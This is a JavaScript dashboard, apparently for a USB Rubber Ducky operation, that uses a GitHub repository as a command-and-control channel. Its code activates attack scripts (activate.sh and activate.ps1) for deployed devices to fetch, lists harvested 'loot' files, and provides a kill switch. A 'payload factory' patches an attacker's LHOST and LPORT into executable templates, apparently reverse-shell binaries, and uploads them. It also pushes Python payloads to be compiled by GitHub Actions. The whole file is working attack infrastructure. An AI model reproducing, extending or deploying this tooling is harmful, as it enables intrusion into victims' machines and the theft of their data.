const API_BASE = 'https://api.github.com';

// DOM Elements
const elements = {
    settings: document.getElementById('settings'),
    dashboard: document.getElementById('dashboard'),
    repoName: document.getElementById('repoName'),
    token: document.getElementById('githubToken'),
    connectBtn: document.getElementById('connectBtn'),
    statusIndicator: document.getElementById('connectionStatus'),
    activePayloadDisplay: document.getElementById('activePayloadsList'),
    fileList: document.getElementById('fileList'),
    refreshBtn: document.getElementById('refreshFiles'),
    killSwitch: document.getElementById('killSwitch'),
    lootList: document.getElementById('lootList'),
    refreshLootBtn: document.getElementById('refreshLoot'),
    editorModal: document.getElementById('editorModal'),
    editorContent: document.getElementById('editorContent'),
    editorTitle: document.getElementById('editorTitle')
};

// State
let state = {
    token: localStorage.getItem('ducky_token') || '',
    repo: localStorage.getItem('ducky_repo') || '',
    activePayload: 'UNKNOWN'
};

// Editor State
let editorState = {
    attackName: null,
    fileType: 'sh'
};


// Initialization
function init() {
    if (state.token && state.repo) {
        elements.repoName.value = state.repo;
        elements.token.value = state.token;
        testConnection(state.repo, state.token).then(result => {
            if (result.success) showDashboard();
        });
    }
    setupEventListeners();
}

function setupEventListeners() {
    elements.connectBtn.addEventListener('click', async () => {
        const repo = elements.repoName.value.trim();
        const token = elements.token.value.trim();
        const btn = elements.connectBtn;

        if (!repo || !token) {
            alert('Please enter both Repo Name and Token');
            return;
        }

        btn.innerText = 'CONNECTING...';
        btn.disabled = true;

        try {
            const result = await testConnection(repo, token);
            if (result.success) {
                saveCredentials(repo, token);
                showDashboard();
            } else {
                alert(`CONNECTION FAILED:\n${result.error}\n\nCheck your Token permissions (Repo: Read/Write) and Repo Name.`);
            }
        } catch (e) {
            alert('System Error: ' + e.message);
        } finally {
            btn.innerText = 'INITIALIZE_CONNECTION';
            btn.disabled = false;
        }
    });

    elements.refreshBtn.addEventListener('click', () => {
        loadFiles();
        checkActivePayload();
    });

    // New Listeners
    elements.killSwitch.addEventListener('click', triggerKillSwitch);
    elements.refreshLootBtn.addEventListener('click', loadLoot);

    // Payload Factory Listener
    document.getElementById('generatePayloadBtn').addEventListener('click', handlePayloadGeneration);
}

// GitHub API Functions
async function testConnection(repo, token) {
    try {
        const response = await fetch(`${API_BASE}/repos/${repo}`, {
            headers: {
                'Authorization': `Bearer ${token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        if (response.ok) {
            return { success: true };
        } else {
            return { success: false, error: `${response.status} ${response.statusText}` };
        }
    } catch (e) {
        return { success: false, error: e.message };
    }
}

async function loadFiles() {
    elements.fileList.innerHTML = '<div class="loading">LOADING_MODULES...</div>';

    try {
        // Fetch contents of Rubber_Ducky/Attacks
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Attacks`, {
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.message || response.statusText);
        }

        const files = await response.json();
        renderFiles(files);
    } catch (e) {
        elements.fileList.innerHTML = `<div class="terminal-output" style="color: var(--accent)">ERROR: ${e.message}</div>`;
    }
}

async function checkActivePayload() {
    elements.activePayloadDisplay.innerHTML = '<span class="loading">SCANNING_ACTIVATION_SCRIPTS...</span>';

    try {
        // Read remote/activate.sh to see what's active
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/remote/activate.sh`, {
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        if (response.ok) {
            const data = await response.json();
            const content = atob(data.content);

            // Look for the attack name in the metadata comment
            // Example: # ATTACK: Rickroll
            const match = content.match(/# ATTACK: (.+)/);
            if (match && match[1]) {
                state.activePayload = match[1].trim();
                elements.activePayloadDisplay.innerHTML = `<span class="status-indicator connected">${state.activePayload}</span>`;
                return;
            }
        }

        elements.activePayloadDisplay.innerHTML = '<span class="status-indicator">NO_ACTIVE_PAYLOAD_DETECTED</span>';
    } catch (e) {
        console.error(e);
        elements.activePayloadDisplay.innerHTML = '<span class="status-indicator error">SCAN_ERROR</span>';
    }
}

async function updateFile(path, content, message, isBase64 = false) {
    try {
        let sha = '';
        try {
            const current = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
                headers: {
                    'Authorization': `Bearer ${state.token}`,
                    'Accept': 'application/vnd.github.v3+json'
                }
            });
            if (current.ok) {
                const data = await current.json();
                sha = data.sha;
            }
        } catch (e) { }

        const body = {
            message: message,
            content: isBase64 ? content : btoa(content),
            branch: 'main'
        };

        if (sha) body.sha = sha;

        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
            method: 'PUT',
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(body)
        });

        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.message || response.statusText);
        }

        return true;
    } catch (e) {
        throw e;
    }
}

// UI Functions
function showDashboard() {
    elements.settings.classList.add('hidden');
    elements.dashboard.classList.remove('hidden');
    elements.statusIndicator.innerText = 'CONNECTED';
    elements.statusIndicator.classList.add('connected');
    loadFiles();
    checkActivePayload();
    loadLoot();
    loadTemplates();
    loadBinaryTracker();
}

window.switchSource = function (source) {
    const libDiv = document.getElementById('sourceLib');
    const localDiv = document.getElementById('sourceLocal');
    const btnLib = document.getElementById('btnSourceLib');
    const btnLocal = document.getElementById('btnSourceLocal');

    if (source === 'lib') {
        libDiv.classList.remove('hidden');
        localDiv.classList.add('hidden');
        btnLib.classList.add('active');
        btnLocal.classList.remove('active');
    } else {
        libDiv.classList.add('hidden');
        localDiv.classList.remove('hidden');
        btnLib.classList.remove('active');
        btnLocal.classList.add('active');
    }
};

async function loadTemplates() {
    const select = document.getElementById('templateSelect');
    select.innerHTML = '<option value="" disabled selected>SELECT_TEMPLATE...</option>';

    try {
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/Ducky_Control_Center/Templates`, {
            headers: { 'Authorization': `Bearer ${state.token}` }
        });

        if (response.ok) {
            const files = await response.json();
            if (Array.isArray(files)) {
                files.forEach(file => {
                    // Allow exe, bin, macho, elf, etc.
                    if (file.name.match(/\.(exe|bin|macho|elf|out)$/i)) {
                        const option = document.createElement('option');
                        option.value = file.path;
                        option.innerText = file.name;
                        select.appendChild(option);
                    }
                });
            }
        }
    } catch (e) {
        console.error('Failed to load templates:', e);
        select.innerHTML = '<option>ERROR_LOADING_TEMPLATES</option>';
    }
}

function renderFiles(files) {
    elements.fileList.innerHTML = '';

    if (!Array.isArray(files)) return;

    // Filter for directories (Attacks)
    const attacks = files.filter(f => f.type === 'dir');

    attacks.forEach(attack => {
        const card = document.createElement('div');
        card.className = 'file-card';

        const isActive = attack.name === state.activePayload;
        if (isActive) card.classList.add('active');

        card.innerHTML = `
            <div class="file-info">
                <div class="file-name">${attack.name}</div>
                <div class="file-size">MODULE</div>
            </div>
            <div class="file-actions">
                <button class="cyber-btn small" onclick="openEditor('${attack.name}')" style="margin-right: 5px; border-color: var(--text-secondary); color: var(--text-secondary);">EDIT</button>
                ${!isActive ? `<button class="cyber-btn small" onclick="activatePayload('${attack.name}')">ACTIVATE</button>` : '<span class="status-indicator connected">ACTIVE</span>'}
            </div>
        `;
        elements.fileList.appendChild(card);
    });
}

// Lootbox Logic
async function loadLoot() {
    elements.lootList.innerHTML = '<div class="loading">SCANNING_LOOT...</div>';
    try {
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Loot`, {
            headers: { 'Authorization': `Bearer ${state.token}` }
        });
        if (response.ok) {
            const files = await response.json();
            renderLoot(files);
        } else {
            elements.lootList.innerHTML = '<div class="terminal-output">NO_LOOT_FOUND</div>';
        }
    } catch (e) {
        elements.lootList.innerHTML = `<div class="terminal-output error">ERROR: ${e.message}</div>`;
    }
}

function renderLoot(files) {
    elements.lootList.innerHTML = '';
    if (!Array.isArray(files) || files.length === 0) {
        elements.lootList.innerHTML = '<div class="terminal-output">NO_LOOT_FOUND</div>';
        return;
    }

    files.forEach(file => {
        const card = document.createElement('div');
        card.className = 'file-card';
        card.innerHTML = `
                <div class="file-info">
                    <div class="file-name">${file.name}</div>
                    <div class="file-size">${(file.size / 1024).toFixed(2)} KB</div>
                </div>
                <div class="file-actions">
                    <a href="${file.html_url}" target="_blank" class="cyber-btn small">VIEW</a>
                </div>
            `;
        elements.lootList.appendChild(card);
    });
}

// Editor Logic
window.openEditor = async function (attackName) {
    editorState.attackName = attackName;
    editorState.fileType = 'sh';
    elements.editorTitle.innerText = `EDIT_PAYLOAD: ${attackName}`;
    elements.editorModal.classList.remove('hidden');
    await loadEditorContent();
};

window.closeEditor = function () {
    elements.editorModal.classList.add('hidden');
};

window.switchTab = async function (type) {
    editorState.fileType = type;
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    event.target.classList.add('active');
    await loadEditorContent();
};

async function loadEditorContent() {
    elements.editorContent.value = 'LOADING...';
    try {
        const filename = editorState.fileType === 'sh' ? 'activate.sh' : 'activate.ps1';
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Attacks/${editorState.attackName}/${filename}`, {
            headers: { 'Authorization': `Bearer ${state.token}` }
        });
        if (response.ok) {
            const data = await response.json();
            elements.editorContent.value = atob(data.content);
        } else {
            elements.editorContent.value = '# FILE NOT FOUND';
        }
    } catch (e) {
        elements.editorContent.value = 'ERROR LOADING FILE';
    }
}

window.saveEditorContent = async function () {
    const content = elements.editorContent.value;
    const filename = editorState.fileType === 'sh' ? 'activate.sh' : 'activate.ps1';
    const path = `Rubber_Ducky/Attacks/${editorState.attackName}/${filename}`;

    try {
        await updateFile(path, content, `Update ${filename} for ${editorState.attackName}`);
        // Removed success alert
        closeEditor(); // Close editor on success
    } catch (e) {
        console.error('SAVE_FAILED: ' + e.message); // Log error
    }
};

function saveCredentials(repo, token) {
    state.repo = repo;
    state.token = token;
    localStorage.setItem('ducky_repo', repo);
    localStorage.setItem('ducky_token', token);
}

// Logic Functions
async function deleteFile(path, message) {
    try {
        // Get SHA first
        let sha = '';
        const current = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        if (current.ok) {
            const data = await current.json();
            sha = data.sha;
        } else {
            return false; // File doesn't exist
        }

        const body = {
            message: message,
            sha: sha,
            branch: 'main'
        };

        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
            method: 'DELETE',
            headers: {
                'Authorization': `Bearer ${state.token}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(body)
        });

        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.message || response.statusText);
        }

        return true;
    } catch (e) {
        throw e;
    }
}

async function triggerKillSwitch() {
    // Removed confirm check

    const btn = elements.killSwitch;
    const originalText = btn.innerText;
    btn.innerText = 'KILLING...';
    btn.disabled = true;

    try {
        await deleteFile('Rubber_Ducky/remote/activate.sh', 'KILL SWITCH: Deleted activate.sh');
        await deleteFile('Rubber_Ducky/remote/activate.ps1', 'KILL SWITCH: Deleted activate.ps1');

        // Removed success alert
        state.activePayload = 'KILLED';
        elements.activePayloadDisplay.innerHTML = '<span class="status-indicator error">KILLED</span>';
        loadFiles(); // Refresh file list to show inactive state
    } catch (e) {
        console.error('KILL SWITCH FAILED: ' + e.message); // Log error instead of alert
    } finally {
        btn.innerText = originalText;
        btn.disabled = false;
    }
}

window.activatePayload = async function (attackName) {
    // Removed confirm check

    try {
        // 1. Fetch source scripts
        const [shRes, ps1Res] = await Promise.all([
            fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Attacks/${attackName}/activate.sh`, { headers: { 'Authorization': `Bearer ${state.token}` } }),
            fetch(`${API_BASE}/repos/${state.repo}/contents/Rubber_Ducky/Attacks/${attackName}/activate.ps1`, { headers: { 'Authorization': `Bearer ${state.token}` } })
        ]);

        if (!shRes.ok || !ps1Res.ok) throw new Error("Could not find activate.sh or activate.ps1 in attack folder");

        const shData = await shRes.json();
        const ps1Data = await ps1Res.json();

        // Decode content to inject comment
        const shContent = atob(shData.content);
        const ps1Content = atob(ps1Data.content);

        // Inject Metadata
        const newShContent = `# ATTACK: ${attackName}\n${shContent}`;
        const newPs1Content = `# ATTACK: ${attackName}\n${ps1Content}`;

        // 2. Update target scripts
        await updateFile('Rubber_Ducky/remote/activate.sh', newShContent, `Activate ${attackName} (sh)`);
        await updateFile('Rubber_Ducky/remote/activate.ps1', newPs1Content, `Activate ${attackName} (ps1)`);

        // Removed success alert
        checkActivePayload();
        loadFiles();
    } catch (e) {
        console.error(`FAILED: ${e.message}`); // Log error instead of alert
    }
};

async function handlePayloadGeneration() {
    const fileInput = document.getElementById('templateFile');
    const templateSelect = document.getElementById('templateSelect');
    const lhost = document.getElementById('lhost').value;
    const lport = document.getElementById('lport').value;
    const placeholder = document.getElementById('placeholderIp').value;
    const btn = document.getElementById('generatePayloadBtn');

    // Check active source
    const isLocal = document.getElementById('btnSourceLocal').classList.contains('active');

    let buffer = null;
    let filename = '';

    if (!lhost || !lport) {
        alert('Please enter LHOST and LPORT.');
        return;
    }

    btn.innerText = 'FETCHING...';
    btn.disabled = true;

    try {
        // 1. Determine Source
        if (isLocal) {
            // Local File
            if (!fileInput.files.length) throw new Error("No local file selected");
            const file = fileInput.files[0];
            buffer = await file.arrayBuffer();
            filename = file.name; // Use original name
        } else {
            // Remote Template
            if (!templateSelect.value) throw new Error("No template selected");
            const path = templateSelect.value;
            const templateName = templateSelect.options[templateSelect.selectedIndex].text;

            const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
                headers: {
                    'Authorization': `Bearer ${state.token}`,
                    'Accept': 'application/vnd.github.v3.raw'
                }
            });

            if (!response.ok) throw new Error('Failed to download template');

            buffer = await response.arrayBuffer();
            filename = templateName; // Use original name
        }

        btn.innerText = 'UPLOADING...';

        // Use the Patcher module
        const patchedBlob = Patcher.patch(buffer, placeholder, lhost, "4444", lport);

        // Convert Blob to Base64 for GitHub API
        const reader = new FileReader();
        reader.readAsDataURL(patchedBlob);
        reader.onloadend = async function () {
            const base64data = reader.result.split(',')[1];

            try {
                // 1. Upload Binary (Overwrite)
                const targetPath = `binaries/${filename}`;
                await updateFile(targetPath, base64data, `Update payload ${filename}`, true);

                // 2. Update Log
                await updateBinaryLog(filename, lhost, lport);

                btn.innerText = 'SAVED TO REPO';
                setTimeout(() => {
                    btn.innerText = 'GENERATE_PAYLOAD';
                    btn.disabled = false;
                }, 3000);
            } catch (err) {
                throw new Error("Upload Failed: " + err.message);
            }
        };

    } catch (e) {
        console.error(e);
        alert('Generation Failed: ' + e.message);
        btn.innerText = 'ERROR';
        btn.disabled = false;
    }
}

async function updateBinaryLog(filename, lhost, lport) {
    const logPath = 'binaries/binary_log.json';
    let log = {};
    let sha = '';

    // Fetch existing log
    try {
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${logPath}`, {
            headers: { 'Authorization': `Bearer ${state.token}` }
        });
        if (response.ok) {
            const data = await response.json();
            log = JSON.parse(atob(data.content));
            sha = data.sha;
        }
    } catch (e) {
        // Log doesn't exist yet, create new
    }

    // Update entry
    log[filename] = {
        lhost: lhost,
        lport: lport,
        updated: new Date().toISOString()
    };

    // Save log
    const content = btoa(JSON.stringify(log, null, 2));
    const body = {
        message: `Update binary log for ${filename}`,
        content: content,
        branch: 'main'
    };
    if (sha) body.sha = sha;

    await fetch(`${API_BASE}/repos/${state.repo}/contents/${logPath}`, {
        method: 'PUT',
        headers: {
            'Authorization': `Bearer ${state.token}`,
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(body)
    });

    // Refresh UI
    loadBinaryTracker();
}

// Script Compiler Logic
let pyodide = null;

async function loadPyodideIfNeeded() {
    if (pyodide) return;

    const output = document.getElementById('syntaxOutput');
    output.classList.remove('hidden');
    output.innerText = 'LOADING_PYODIDE...';

    try {
        // Load Pyodide script dynamically
        if (!window.loadPyodide) {
            await new Promise((resolve, reject) => {
                const script = document.createElement('script');
                script.src = "https://cdn.jsdelivr.net/pyodide/v0.23.4/full/pyodide.js";
                script.onload = resolve;
                script.onerror = reject;
                document.head.appendChild(script);
            });
        }

        pyodide = await loadPyodide();
        output.innerText = 'PYODIDE_LOADED';
        setTimeout(() => output.classList.add('hidden'), 2000);
    } catch (e) {
        output.innerText = 'FAILED_TO_LOAD_PYODIDE: ' + e.message;
        throw e;
    }
}

async function checkSyntax() {
    const code = document.getElementById('pythonEditor').value;
    const output = document.getElementById('syntaxOutput');
    output.classList.remove('hidden');
    output.innerText = 'CHECKING_SYNTAX...';

    try {
        await loadPyodideIfNeeded();

        // Redirect stdout/stderr
        pyodide.setStdout({ batched: (msg) => console.log(msg) });
        pyodide.setStderr({ batched: (msg) => console.log(msg) });

        // Try to compile (not run) to check syntax
        pyodide.runPython(`
import codeop
try:
    codeop.compile_command('''${code.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}''', symbol='exec')
except Exception as e:
    raise e
`);

        output.innerHTML = '<span class="status-indicator connected">SYNTAX_OK</span>';
    } catch (e) {
        // Parse error message
        let msg = e.message;
        if (msg.includes('PythonError:')) {
            msg = msg.split('PythonError:')[1].trim();
        }
        output.innerHTML = `<span class="status-indicator error">SYNTAX_ERROR: ${msg}</span>`;
    }
}

async function compileScript() {
    const code = document.getElementById('pythonEditor').value;
    const name = document.getElementById('scriptName').value || 'payload';
    const btn = document.getElementById('compileScriptBtn');
    const status = document.getElementById('compilerStatus');

    if (!code.trim()) {
        alert('Please enter some Python code.');
        return;
    }

    btn.disabled = true;
    btn.innerText = 'COMMITTING...';
    status.innerText = 'UPLOADING_SOURCE...';

    try {
        // 1. Upload Source File
        const path = `Rubber_Ducky/payloads/src/${name}.py`;
        // Fix: Pass false for isBase64 so it gets encoded
        await updateFile(path, code, `Add source for ${name}`, false);

        status.innerText = 'WAITING_FOR_BUILD...';
        btn.innerText = 'BUILDING...';

        // 2. Poll for results (simple version: just tell user to wait)
        alert(`Source uploaded to ${path}.\n\nGitHub Actions will now compile this into binaries.\n\nPlease wait 1-3 minutes and then check the LOOT_BOX or BINARY_TRACKER.`);

        status.innerText = 'BUILD_TRIGGERED';

    } catch (e) {
        console.error(e);
        status.innerText = 'ERROR';
        alert('Compilation Trigger Failed: ' + e.message);
    } finally {
        btn.disabled = false;
        btn.innerText = 'COMPILE_TO_BINARY';
    }
}

// Add Event Listeners for Compiler
document.getElementById('checkSyntaxBtn').addEventListener('click', checkSyntax);
document.getElementById('compileScriptBtn').addEventListener('click', compileScript);

async function loadBinaryTracker() {
    const list = document.getElementById('trackerList');
    list.innerHTML = '<span class="loading">LOADING_LOGS...</span>';

    try {
        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/binaries/binary_log.json`, {
            headers: { 'Authorization': `Bearer ${state.token}` }
        });

        if (response.ok) {
            const data = await response.json();
            const log = JSON.parse(atob(data.content));

            if (Object.keys(log).length === 0) {
                list.innerHTML = 'NO_BINARIES_TRACKED';
                return;
            }

            let html = '<table style="width:100%; text-align:left; border-collapse: collapse;">';
            html += '<tr style="border-bottom: 1px solid #333; color: #666;"><th>BINARY</th><th>LHOST</th><th>LPORT</th><th>UPDATED</th></tr>';

            for (const [filename, config] of Object.entries(log)) {
                const date = new Date(config.updated).toLocaleString();
                html += `
                    <tr style="border-bottom: 1px solid #222;">
                        <td style="padding: 10px 0; color: var(--primary);">${filename}</td>
                        <td style="color: var(--accent);">${config.lhost}</td>
                        <td>${config.lport}</td>
                        <td style="font-size: 0.8rem; color: #666;">${date}</td>
                    </tr>
                `;
            }
            html += '</table>';
            list.innerHTML = html;
        } else {
            list.innerHTML = 'NO_LOGS_FOUND';
        }
    } catch (e) {
        console.error(e);
        list.innerHTML = 'ERROR_LOADING_TRACKER';
    }
}


// Start
init();
